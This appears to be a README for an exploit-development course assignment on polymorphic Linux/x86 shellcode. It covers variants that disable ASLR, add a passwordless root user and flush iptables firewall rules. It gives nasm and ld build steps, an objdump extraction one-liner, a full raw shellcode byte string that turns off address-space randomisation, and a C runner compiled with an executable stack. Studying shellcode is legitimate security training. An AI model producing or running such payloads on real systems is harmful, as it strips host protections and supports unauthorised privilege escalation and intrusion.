# Assignment 6: Polymorphism

The shellcode featured in this directory are polymorphic versions of the following three shellcodes from [ShellStorm](https://shell-storm.org)

- Shellcode 1: - [Linux/x86 - ASLR deactivation - 83 bytes](https://shell-storm.org/shellcode/files/shellcode-813.php) _by Jean Pascal Pereira_
- Shellcode 2: - [Linux/x86 - add root user (r00t) with no password to /etc/passwd - 69 bytes](https://shell-storm.org/shellcode/files/shellcode-211.php) _by Kris Katterjohn_
- Shellcode 3: - [Linux/x86 - execve() of /sbin/iptables -F - 70 bytes](https://shell-storm.org/shellcode/files/shellcode-545.php) _by zillion_

In order to generate the shellcode, it must be compiled using nasm as follows:

```bash
nasm -f elf32 -o disable_aslr_polymorphic.o disable_aslr_polymorphic.nasm
```

Link the program with ld:

```bash
ld -o disable_aslr_polymorphic disable_aslr_polymorphic.o
```

Extract the raw shellcode using the following one-liner from [CommandlineFu](https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump)

```bash
objdump -d ./disable_aslr_polymorphic |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x1d\x31\xc0\x5b\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3\x6a\x30\x89\xe1\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xde\xff\xff\xff\x2f\x70\x72\x6f\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x7a\x65\x5f\x76\x61\x5f\x73\x70\x61\x63\x65"
```

Paste the raw shellcode into shellcode.c

```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1d\x31\xc0\x5b\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3\x6a\x30\x89\xe1\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xde\xff\xff\xff\x2f\x70\x72\x6f\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x7a\x65\x5f\x76\x61\x5f\x73\x70\x61\x63\x65";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

Compile shellcode.c with gcc:

```bash
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

Execute the shellcode binary
```bash
./shellcode                                                                              1 ⚙
Shellcode Length:  71
```

---
